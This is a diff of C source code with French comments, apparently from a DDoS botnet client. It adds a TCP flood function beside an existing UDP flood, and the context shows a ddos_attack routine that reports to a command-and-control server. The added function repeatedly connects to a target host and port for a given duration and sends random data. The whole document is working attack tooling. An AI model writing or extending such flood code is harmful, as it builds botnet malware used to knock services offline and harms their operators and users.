@@ -151,6 +151,37 @@ void udp_flood(char* target, int port, int duration) {
     close(sock);
 }
 
+// Fonction pour effectuer une attaque TCP flood
+void tcp_flood(char* target, int port, int duration) {
+    int sock;
+    struct sockaddr_in addr;
+    
+    // Configurer l'adresse cible
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = inet_addr(target);
+    
+    time_t start_time = time(NULL);
+    while (time(NULL) - start_time < duration) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock != -1) {
+            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1) {
+                char *data = malloc(1024);
+                if (data) {
+                    for (int i = 0; i < 1024; i++) {
+                        data[i] = rand() % 256;
+                    }
+                    send(sock, data, 1024, 0);
+                    free(data);
+                }
+            }
+            close(sock);
+        }
+        usleep(100);
+    }
+}
+
 // Fonction principale pour effectuer une attaque DDoS
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
     // Informer le serveur C2 du début de l'attaque
